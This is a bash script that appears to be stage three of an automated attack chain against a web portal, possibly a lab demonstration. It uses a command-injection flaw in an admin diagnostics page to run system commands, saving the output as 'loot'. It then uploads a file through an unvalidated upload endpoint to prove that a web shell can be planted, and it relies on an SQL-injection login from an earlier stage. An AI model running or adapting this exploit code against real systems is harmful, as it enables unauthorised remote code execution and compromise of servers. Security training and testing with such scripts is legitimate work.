#!/bin/bash
# Stage 3 — Execution
#   OS command injection -> remote code execution  (MITRE T1059)
#   Unrestricted file upload -> web shell drop      (MITRE T1505)
source "$(dirname "$0")/lib.sh"
banner "STAGE 3 — EXECUTION (T1059 RCE / T1505 web shell)"

[ -f "$COOKIE" ] || sqli_login || { err "need a session (run stage 2)"; exit 1; }

log "Proving RCE via /admin/diagnostics command injection:"
rce "echo '--- whoami ---'; id; echo '--- host ---'; hostname; uname -a" | tee "$LOOT/03-rce.txt"

echo
log "Dropping an unrestricted-upload web shell (T1505) ..."
cat > /tmp/cmd.py <<'EOF'
# uploaded via the portal's unvalidated /upload endpoint
# (served at /uploads/cmd.py — demonstrates unrestricted file upload)
print("cryvion-webshell-marker")
EOF
curl -s -F "file=@/tmp/cmd.py" -b "$COOKIE" "http://$TARGET/upload" >/dev/null
if curl -s "http://$TARGET/uploads/cmd.py" | grep -q "cryvion-webshell-marker"; then
  ok "Web shell uploaded & retrievable at http://$TARGET/uploads/cmd.py"
else
  err "upload verification failed"
fi
ok "Code execution established on the web tier (as root)."
